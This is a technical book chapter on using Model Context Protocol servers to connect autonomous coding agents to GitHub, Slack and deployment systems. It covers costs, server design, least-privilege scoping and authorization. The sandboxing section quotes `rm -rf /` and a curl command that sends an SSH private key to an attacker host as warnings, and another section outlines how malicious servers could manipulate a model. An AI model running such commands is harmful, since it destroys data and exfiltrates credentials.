# Chapter 10: MCP — Wiring the Loop to the World

> **Reading note.** Named practitioner scenarios and their timings, costs, and outcomes are fictional illustrations unless a specific source is identified. Numerical assumptions are not provider quotes or measured results. Code, commands, configuration, and traces are illustrative pseudocode/API sketches, not executed examples. In particular, `loopkit` is a teaching namespace, not a tested installable SDK. Legacy product attributions marked unverified are not evidence for deployment decisions.

> Connectors are what turn "here is a suggested fix" into "I opened the PR, watched CI, and posted the update."

## The Last Mile

Marcus Chen runs the developer-experience team at a fintech startup with sixty engineers. Their coding agent is good: it reads a ticket, finds the relevant code, generates a patch, and runs the test suite locally. The pass rate is 78% on first attempt, climbing to 94% after one retry. Marcus should be celebrating. Instead, he is looking at the time-to-merge numbers.

The agent produces a passing patch in under four minutes. Then a human copies the patch into a branch, pushes it, opens a pull request, writes a description based on the agent's summary, assigns two reviewers per the team's CODEOWNERS file, waits for CI (which runs a broader test suite than local), responds to the two or three review comments that CI or reviewers surface, pushes a fix-up commit, waits for CI again, and merges. Median time from "patch ready" to "merged": eleven hours. The cognitive work took four minutes. The mechanical wiring between systems consumed the rest of the working day.

Marcus adds three MCP connectors: GitHub (for branches, PRs, and CI status), Linear (for ticket state transitions), and Slack (for channel notifications). The loop now runs end-to-end without human intermediation: read the Linear ticket, generate the patch, create a feature branch and push it, open a PR with a generated description that references the ticket, monitor CI status, post to the team's Slack channel when CI passes, update the Linear ticket status to "in review," and—if the reviewer approves—merge and mark the ticket done. Median time-to-merge drops to forty-three minutes for changes that pass CI on first attempt.

The agent did not get smarter. It did not produce better patches. It got connected. The connectors closed the gap between "produce a correct artifact" and "deliver an outcome." Without connectors, a loop is a suggestion engine that produces work a human must still deliver. With connectors, it is an autonomous delivery system that completes the full workflow from trigger to shipped result. The distinction maps directly to the Autonomy Ladder ([Chapter 2](chapter-02.md), *Levels of Agency*): adaptive planning can operate on local tools, while a connector can be used by a fully fixed workflow. Connectivity and autonomy are different dimensions.

This chapter covers MCP as the integration substrate for production loops: what it provides, when you need it, what it costs, and when the costs outweigh the benefits.

## The Protocol in Context

Model Context Protocol defines a standard interface between an AI application (the client) and external services (the servers). The protocol uses JSON-RPC messages with transports including stdio and Streamable HTTP in applicable versions. Server-Sent Events may be used within HTTP transport; legacy HTTP+SSE and Streamable HTTP must not be treated as interchangeable deployment contracts. Pin and test the transport version used by your client and server. An MCP client—your loop harness—connects to one or more MCP servers. Each server exposes a set of capabilities that the loop can discover dynamically.

The architectural value is separation of concerns. Your loop harness handles context management, model orchestration, iteration logic, and verification. MCP servers handle authentication to external services, rate limiting, retries, error translation, and the mechanical details of each integration's API. Neither side needs to know the other's internals. The loop harness does not know that GitHub's API requires pagination with link headers; it calls `list_pull_requests` and gets results. The GitHub MCP server does not know whether it is serving a coding loop, a review loop, or a human in a chat interface; it exposes tools and lets the client decide which to call.

``` mermaid

flowchart LR
    subgraph "Loop Harness (MCP Client)"
        M[Model] --> O[Orchestrator]
        O --> CC[MCP Client Library]
    end
    subgraph "MCP Servers"
        CC -->|"JSON-RPC / stdio"| G[GitHub Server<br/>35 tools]
        CC -->|"JSON-RPC / HTTP+SSE"| S[Slack Server<br/>11 tools]
        CC -->|"JSON-RPC / stdio"| J[Jira Server<br/>Selected capabilities]
        CC -->|"JSON-RPC / stdio"| D[Custom Deploy Server<br/>3 tools]
    end
    G --> GH[(GitHub API)]
    S --> SL[(Slack API)]
    J --> JR[(Jira API)]
    D --> INT[(Internal Deploy System)]
```

Each server exposes three capability types. **Tools** are the primary interface for loops: actions the model can take (create a PR, send a message, run a query, trigger a deploy). **Resources** provide readable data (file contents, database schemas, API documentation) that the model can pull into its context on demand. **Prompts** are reusable templates for common operations, useful for standardising how the model interacts with a particular service. For loop engineering, tools dominate the design conversation because they are what enable the loop to act on the world rather than merely describe what it would do.

## When MCP Is the Right Primitive

Not every integration requires an MCP server. A function in your harness that calls a single endpoint with a static API key is simpler, faster, and perfectly adequate for many use cases. The decision to introduce an MCP server—with its process management, protocol overhead, serialisation costs, and additional failure modes—should be justified by at least one of four conditions.

**Shared infrastructure across multiple loops.** When your coding loop, your review loop, your triage loop, and your on-call assistant all need GitHub access, implementing GitHub's API four times means four sets of authentication bugs, four places to handle rate limits, four code paths to update when GitHub changes their API. A single GitHub MCP server serves all four loops. The auth logic lives in one place. Rate-limit handling is centralised. When GitHub deprecates an endpoint, you update one server, not four harnesses. This is the classic shared-library argument applied to tool infrastructure.

**Complex authentication flows.** OAuth2 with PKCE, token refresh, certificate-based mutual TLS, SAML federation chains—these are non-trivial to implement correctly and catastrophic to implement incorrectly. An integration can centralize credential handling, but MCP alone does not guarantee correct storage, refresh, revocation, or redaction. Assign those responsibilities explicitly between host, client, authorization server, MCP server, and downstream service; keep credentials outside model-visible content. Centralization can reduce duplicated implementation and make credential isolation easier to audit. Those benefits depend on tested token handling, redaction, tenant separation, and permissions; the protocol does not supply them automatically.

**Independent maintenance lifecycle.** The Jira API releases new fields, the Slack API deprecates message formatting options, the internal deployment system adds a new required parameter. If these integrations are embedded in your loop harness, every API change requires a harness release—which means testing, deployment, and coordination across all loops that use that harness version. If they are MCP servers, each evolves independently. You update the Jira server without touching the harness. The loop sees the same tool interface regardless of what the server does internally to translate calls into Jira's current API format.

**Dynamic capability discovery.** A new team builds a custom MCP server for their internal knowledge base. Registration can make a capability discoverable to compatible clients. Use still requires host configuration, protocol compatibility, server trust review, and scoped authorization. A catalog entry must not grant permission. Dynamic discovery is useful for some fleets, while a pinned tool allowlist is often simpler and easier to audit.

When none of these conditions apply—you have a single loop calling a single API endpoint that only your loop will ever use and that uses a simple API key—a direct tool function in the harness is the right choice. MCP adds value through reuse, abstraction, and decoupling. Without those requirements, it adds only overhead. The decision framework from [Chapter 13](chapter-13.md) (*Choosing Your Primitive*) applies: use the cheapest primitive that solves the problem reliably, and escalate to MCP only when the shared-infrastructure or auth-complexity benefits justify the protocol cost.

## The Real Costs

MCP is not free. Teams that adopt it without accounting for its costs discover them painfully in production monitoring dashboards. Three cost categories must be weighed against the benefits.

**Latency per call.** Every tool invocation that routes through an MCP server adds an RPC round-trip: the harness serialises the request to JSON, transmits it (over stdio pipe or HTTP), the server deserialises it, executes the operation, serialises the response, transmits it back, and the harness deserialises the result. For stdio communication on the same machine, this overhead is typically 50–150ms per call \[ESTIMATE, based on observed process-switching overhead plus JSON serialisation time for moderate payloads\]. For HTTP-based remote servers, add network latency: 100–500ms depending on server location and payload size \[ESTIMATE\]. For a tight loop making five tool calls per iteration across ten iterations, the cumulative MCP overhead is 2.5–25 seconds of pure protocol transit—time where the loop is waiting on plumbing rather than doing work.

**Token overhead from exposed tool schemas.** MCP capability discovery and model-context construction are different layers. The host chooses which discovered schemas to expose to the model, when to load or remove them, and how to use caching. An eager client may repeatedly include a large set; a lazy client may load only selected definitions. There is no protocol-wide limit of five active tools or required session-long retention. Measure the actual submitted schemas, provider token accounting, and cache behavior for your client. The unsupported inherited 55,000-token attribution is not used as a universal baseline.

**Supply-chain attack surface.** An MCP server is a dependency that handles two things you care deeply about: your credentials and your tool results. A compromised or malicious server can return manipulated data (poisoning the model's reasoning with false information about your systems), exfiltrate sensitive data from tool arguments (the model passes context to tools without sanitising it), execute unauthorised actions using the credentials it holds (broader permissions than the tool interface suggests), or inject prompt content through tool responses (text in the response that manipulates the model's subsequent behaviour). [Chapter 30](chapter-30.md) (*Security in Autonomous Loops*) covers the full threat model. The practical implication is clear: every MCP server you connect extends your trust boundary. Vet custom servers. Pin versions of community servers. Monitor tool-call patterns for anomalies.

## Building a Custom MCP Server

When community servers do not cover your integration needs—internal systems, proprietary APIs, domain-specific workflows—building a custom MCP server follows a predictable pattern. The critical engineering decisions are not about the protocol (SDKs handle that) but about design: which operations to expose, what permissions to grant, how to handle failures, and how to make the model's interaction with the tools reliable.

The most common mistake in custom server design is exposing too many tools too early. Start with three to five tools that cover the core operations. A deployment server needs check_health, get_recent_deploys, and rollback. It does not need twenty tools covering every possible operational query on day one. Each additional tool can add context or discovery overhead when a client exposes it; the amount depends on that client’s loading policy. Additional tools can be added incrementally when demand is demonstrated by loops that attempt workarounds for missing capabilities.

A second common mistake is inconsistent error handling. When the underlying API returns a 500 error, the server should not propagate a raw HTTP response to the model. It should translate into the structured what/why/suggestion format ([Chapter 9](chapter-09.md)). When the API times out, the server should communicate clearly: "The Grafana API did not respond within 10 seconds. This usually indicates high query load. Suggestion: retry in 30 seconds, or simplify the query time range." Raw protocol errors force the model to reason about HTTP semantics it should not need to understand.

The tool-design principles from [Chapter 9](chapter-09.md) apply doubly to MCP server tools: the description must state when to use the tool (not just what it does), parameters must include boundary documentation, errors must include recovery guidance, and output must be bounded. Additionally, MCP server tools should document their side effects explicitly. A tool that creates a resource (a PR, a deployment, a ticket) must say so in its description because the model needs to know the call is irreversible.

``` python

"""Deployment monitoring MCP server — exposes three tools.

Design intention: keep credentials in trusted server storage and redact outputs.
This schema sketch does not implement those controls. Descriptions document
the ordering constraint; trusted server code must enforce it.
"""
from dataclasses import dataclass
from typing import Any

@dataclass(frozen=True)
class MCPToolDef:
    name: str
    description: str
    parameters: dict[str, Any]

DEPLOY_MONITOR_TOOLS: list[MCPToolDef] = [
    MCPToolDef(
        name="check_health",
        description=(
            "Check the health status of a deployed service. "
            "Use AFTER a deploy completes to verify the service is responding correctly. "
            "Returns: status (healthy/degraded/down), latency_p99_ms, error_rate_pct, "
            "and comparison_to_baseline (better/same/worse with delta). "
            "Always call this before considering a rollback."
        ),
        parameters={
            "type": "object",
            "properties": {
                "service": {
                    "type": "string",
                    "description": "Service name as it appears in the service registry, e.g. 'api-gateway', 'auth-service'",
                },
                "environment": {
                    "type": "string",
                    "enum": ["staging", "production"],
                    "description": "Target environment. Use 'staging' for pre-prod validation.",
                },
            },
            "required": ["service", "environment"],
        },
    ),
    MCPToolDef(
        name="get_recent_deploys",
        description=(
            "List the 5 most recent deployments for a service. "
            "Use to find the commit SHA of the current or a previous deploy "
            "when you need to identify a rollback target. "
            "Returns: list of {sha, timestamp, deployer, status}."
        ),
        parameters={
            "type": "object",
            "properties": {
                "service": {"type": "string", "description": "Service name"},
                "environment": {"type": "string", "enum": ["staging", "production"]},
            },
            "required": ["service"],
        },
    ),
    MCPToolDef(
        name="rollback",
        description=(
            "Roll back a service to a previous deployment. "
            "ONLY use when check_health shows degradation after a recent deploy. "
            "REQUIRES: the target_sha from get_recent_deploys output. "
            "SIDE EFFECT: triggers a new deployment to the target SHA. "
            "Returns: new deployment status and a post-rollback health check result."
        ),
        parameters={
            "type": "object",
            "properties": {
                "service": {"type": "string"},
                "environment": {"type": "string", "enum": ["staging", "production"]},
                "target_sha": {
                    "type": "string",
                    "description": "Full commit SHA to roll back to. Get this from get_recent_deploys.",
                },
            },
            "required": ["service", "environment", "target_sha"],
        },
    ),
]
```

Note the design choices that encode safety into the schema itself. The `rollback` description explicitly states it should only be used when `check_health` shows degradation—describing a precondition the implementation must enforce; prose in a schema does not prevent premature rollbacks. The `target_sha` parameter description states where to get the value—helping the model discover a suitable target; the server must independently validate that the target is approved and belongs to the correct service and environment. The SIDE EFFECT annotation warns the model that this call is irreversible. These constraints reduce the chance of the model calling tools in the wrong order or with fabricated arguments without requiring any prompt engineering in the loop harness itself.

A well-designed custom server exposes the minimum viable tool set, enforces stateful preconditions in trusted server code, implements the assigned authentication responsibilities with explicit client and downstream boundaries, and translates raw API errors into the structured what/why/suggestion format that models can act on. The investment in design quality pays the same dividends described in [Chapter 9](chapter-09.md): better first-call correctness, faster recovery from errors, and fewer wasted iterations across every loop that connects to the server.

## MCP in Fleet Architecture

In a multi-agent fleet ([Chapter 24](chapter-24.md), *From Loop to Fleet*; [Chapter 25](chapter-25.md), *Topologies, Shared State, and Coordination*), MCP connection scoping becomes a structural enforcement mechanism for the principle of least privilege. Each specialist agent connects only to the servers whose capabilities it needs. Connection scoping reduces exposed capabilities only if credential scope, filesystem permissions, and network egress prevent bypass. A shell-capable agent may reach a service directly unless those controls deny it.

A typical fleet configuration might give the code specialist access to filesystem and test-execution servers. The review specialist gets filesystem (read-only) and GitHub (for posting review comments). The deploy specialist gets the deployment monitoring server and a notification server. The orchestrator—the lead agent that coordinates the specialists—gets GitHub and the ticketing system for status tracking but cannot itself deploy, modify files, or send messages.

Connection scoping helps interpret expected traffic, but attribution still requires authenticated caller and task identity in the invocation and receipt. Shared proxies, reused credentials, and alternate network paths can invalidate an inference based only on a tool name. Audit the actual principal that requested and authorized each effect.

The scoping also limits blast radius ([Chapter 31](chapter-31.md), *Sandboxing, Permissions, and Blast Radius*). If a code specialist is compromised, its effective blast radius includes every capability available through tools, shell commands, mounted secrets, and network access. A restricted connector list limits damage only when these other routes are also constrained. Test denied direct access with mock targets rather than assuming that hiding a deployment tool makes deployment impossible.

## Code Execution Through MCP

One MCP capability merits separate discussion: sandboxed code execution. A server that accepts code, executes it in an isolated environment (container, VM, or sandboxed process), and returns the result gives the loop a critical verification capability without requiring trust in the model's generated code to run on the host machine.

This pattern is what enables loops to close the verify step autonomously. The loop generates code, sends it to the execution server, receives structured test results (pass/fail counts, error messages, coverage data), and decides whether to iterate or ship. The execution happens in a controlled environment with resource limits (CPU, memory, time), network restrictions (no external access unless explicitly granted), and filesystem isolation (writes are discarded after execution). The model can execute arbitrary code—but only within the server's sandbox, where isolation, network controls, resource limits, and credential scoping reduce those risks; implementation defects or misconfiguration can still break containment.

For loops whose primary output is code—coding agents, data-pipeline builders, infrastructure-as-code generators—code execution via MCP closes the feedback loop securely. The alternative is giving the model shell access on the host machine, which requires trusting generated code not to run `rm -rf /` or `curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)`. MCP is only the interface to that executor. The actual sandbox boundary, not the protocol name, determines containment.

## The Migration Decision: Direct Tools to MCP

Teams rarely start with MCP. They start with direct tool functions in the harness: a `create_pr()` function that calls GitHub's API, a `send_message()` function for Slack, a `run_query()` function for the database. This is correct—it is the simplest thing that works and follows the principle of choosing the cheapest adequate primitive.

The question is when to migrate. Direct tools accumulate maintenance debt as they multiply. Each tool handles its own authentication, retries, rate limiting, and error translation. When an upstream API changes, you update every loop that calls GitHub directly. When your OAuth refresh logic has a bug, you fix it in each location independently. The maintenance burden grows linearly with the number of loops and the number of integrations.

Three signals indicate it is time to migrate a direct tool into an MCP server. First, the same integration appears in three or more loops—the duplication is now actively creating maintenance risk. Second, an authentication or rate-limiting bug caused an incident because it was fixed in one loop but not another—the duplication has already caused harm. Third, a non-engineer (a product team, a partner team) needs to add an integration to their own loop—the infrastructure needs to be consumable without reading your harness code.

The migration itself is straightforward: extract the tool's implementation into a server process, expose it via the MCP protocol, replace the direct function call in each harness with an MCP client call. The tool's interface (name, parameters, description) stays identical from the model's perspective. The model does not know or care whether a tool is implemented as a local function or as an RPC call to a server. This transparency is a deliberate MCP design property: migrating from direct to MCP is invisible to the agent.

The reverse migration—from MCP back to direct—is also valid. If you discover that a server adds latency that harms your loop's wall-clock budget, and the server has only one consumer, bringing it back in-process eliminates the RPC overhead without losing functionality. The right architecture is not "everything MCP" or "everything direct." It is a pragmatic mix driven by the sharing, maintenance, and latency requirements of each specific integration.

## Implementation Guidance: Transport Access Is Not Effect Approval

Use the MCP Authorization specification version 2025-06-18 as a concrete, version-pinned reference, not as a claim about the latest protocol. It describes authorization as optional at the overall protocol level and specifies the HTTP authorization profile when supported; stdio credentials follow the local environment model rather than that HTTP flow. This matters when reviewing a connector: “speaks MCP” does not establish that it implements the HTTP authorization profile or that its local process is trustworthy.

Separate authentication, resource authorization, and task approval. Authentication identifies a caller. Access-token validation establishes intended resource and permitted scopes. Task approval binds the requested effect to the current user intent, target, and constraints. A token that permits deployment does not mean this conversation may deploy every service the token can reach.

The pinned MCP profile requires intended-audience validation and separates tokens issued for the MCP server from downstream API tokens; client token passthrough is not an acceptable shortcut. RFC 9700 supplies complementary OAuth security guidance, including audience and minimum-privilege restrictions. The trusted resource endpoint validates these properties. A model’s statement that a token “looks right” is irrelevant.

For the illustrative rollback tool, bind an approval to service identity, environment, current deployment revision, target revision, expiration, and approving principal. Immediately before dispatch, check the deployment is still the approved current revision and the principal still has authority. Enforce this at the adapter or service boundary even when the tool description already says “only after a failed health check.” An old health observation may describe a deployment that another operator has already replaced.

Record caller identity in each invocation and receipt rather than inferring it solely from which server an agent can see. Multiple clients can share a connector, and credentials or proxies can blur structural attribution. Limit the credential itself, not just the displayed tool list; hidden tools do not contain a compromised server holding broad credentials.

Exercise acceptance: a conforming schema with a wrong-audience token must be rejected, a correctly scoped token without current task approval must not roll back production, and an old approval must fail after the deployment revision changes. Use mock mutations, not live production rollback, to establish these boundaries. Also test an interrupted response after a simulated accepted deployment; the harness must preserve an unknown effect and reconcile rather than issuing a new deployment blindly.

Primary references: [MCP Authorization, 2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization) and [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700). These support the bounded authorization distinctions above, not the fictional time-to-merge or latency figures elsewhere in this chapter.

## What Breaks

MCP servers fail in ways that direct tool functions do not. A tool implemented as a function in your harness fails synchronously with a clear stack trace. You see the error immediately, in your process, with full debugging context. An MCP server can fail with connection timeouts (the server process died and nobody noticed), protocol errors (mismatched versions, serialisation bugs), partial responses (the server started responding but crashed mid-stream), and stateful corruption (the server's internal state is inconsistent, causing subsequent calls to behave unpredictably).

The most insidious failure mode is silent latency degradation. The server still responds—every call returns a valid result—but response times climb from 100ms to 2,000ms. No error. No timeout. Just slowness that accumulates. A loop that should complete in two minutes takes eight. Without per-tool latency monitoring (percentile tracking per tool name, alerting on P95 drift), this creep goes unnoticed until someone asks why costs are rising or users complain about slow response times.

Credential expiry is another common failure. An access token expires or a scope is denied. The server should distinguish invalid authentication from insufficient authorization through the applicable protocol’s errors rather than labeling every failure “403 Forbidden.” The model can recognize an authentication problem, but cannot legitimately repair missing or revoked authority by guessing credentials or repeating the same request. It sees a permission error and retries with the same arguments, or tries different arguments on the theory that it constructed the call incorrectly. Each retry wastes an iteration. The fix requires the server to handle token refresh proactively (before expiry, not after failure) and the harness to recognise authentication errors as unrecoverable conditions that should trigger escalation rather than iteration. A documented refresh path may recover an expired token; denied scope or revoked consent requires a changed authorization prerequisite. Do not universally retry 401 and 403 once before diagnosing them.

Version coupling creates a more subtle risk. You upgrade an MCP server (adding a new required parameter, changing a response format, renaming a field) while loops are running. In-flight loops encounter unexpected errors because their session started with the old schema but the server now expects new arguments. For safety-critical loops (deploy, data-mutation), this argues for server-side backward compatibility (accept old and new formats for a deprecation window) and, ideally, version negotiation in the protocol handshake. If you cannot guarantee backward compatibility, coordinate server upgrades with loop quiescence—deploy the new server only when no active loops are mid-execution.

## Key Takeaways

- MCP provides a versioned standard interface (JSON-RPC over supported transports) for connecting loops to external services, turning them from suggestion engines into outcome delivery systems.
- Connectors close the last mile: Marcus's loop went from 11-hour time-to-merge to 43 minutes by connecting to GitHub, Linear, and Slack.
- Use an MCP server when you need shared infrastructure, complex auth, independent maintenance lifecycle, or dynamic capability discovery.
- Use a direct tool function when the integration is simple, latency-critical, single-loop, and unlikely to change.
- Measure actual RPC latency and model-visible schema cost; client loading and caching policies vary. Every integration also adds supply-chain and credential risk.
- Code execution through MCP is secure only to the extent that the executor’s independent isolation and permission controls are secure.
- Connector scoping helps least privilege only alongside scoped credentials, resource authorization, filesystem controls, and egress restrictions.
- Security implications are covered in depth in [Chapter 30](chapter-30.md) (*Security in Autonomous Loops*).

## The Loop Contract, So Far

This chapter extends the **escalation path** field: MCP servers with proper error handling define when a loop should escalate (authentication failures, persistent timeouts, state corruption) versus retry. It also extends **budget**: model-visible schema overhead is a client-dependent budget cost that must be measured, and RPC latency accumulates against the wall-clock budget.

## Exercises

1.  **Latency audit** (analysis). If you use any MCP servers (or can set up a test instance), measure the round-trip time for ten consecutive tool calls of varying payload sizes. Calculate the per-iteration overhead for a loop that makes five tool calls per iteration. At what iteration count does the cumulative protocol overhead exceed one minute of wall-clock time?

1.  **Build a minimal MCP server** (build). Using the MCP SDK for your preferred language, implement a server that exposes three tools: `list_todos` (reads from a JSON file), `add_todo` (appends to it), and `mark_done` (updates status). Verify that a client can discover all three tools and call each one successfully. Ensure error messages follow the what/why/suggestion pattern from [Chapter 9](chapter-09.md).

1.  **Permission scoping design** (analysis). For a fleet with four specialist agents (coding, reviewing, testing, deploying), design the MCP server connections for each. For each connection, state: which specific tools are exposed, what credentials the server holds, what the blast radius is if that server is compromised, and what the model cannot do because of what the server does not expose.

1.  **Cost estimation** (estimation). Estimate the monthly token cost of connecting four MCP servers (GitHub: 35 tools, Slack: 11 tools, Sentry: 5 tools, custom server: 8 tools) to a loop that runs 50 times per day with 8 iterations per run and 2 model calls per iteration. Assume 1,000 tokens per tool schema and \$3/MTok input. Then recalculate with Tool Search limiting active tools to 5 at any time. State all assumptions. \[ESTIMATE framework\]

## Sources and Evidence Limits

- [MCP Authorization, version 2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization).
- [RFC 9700: Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700).

The original edition attributed product features and outcome figures to undated or incompletely located vendor material. Those inherited attributions are **unverified in this chapter**; they are not reproduced as a fact-check receipt. The engineering patterns and fictional examples stand separately from those claims. Consult the edition’s source notes for collected references and verify implementation-specific contracts against the version you deploy.

------------------------------------------------------------------------

*Next: [Chapter 11](chapter-11.md) introduces skills—reusable project knowledge that amortises the cold-start tax every loop pays when it wakes up knowing nothing about its target.*
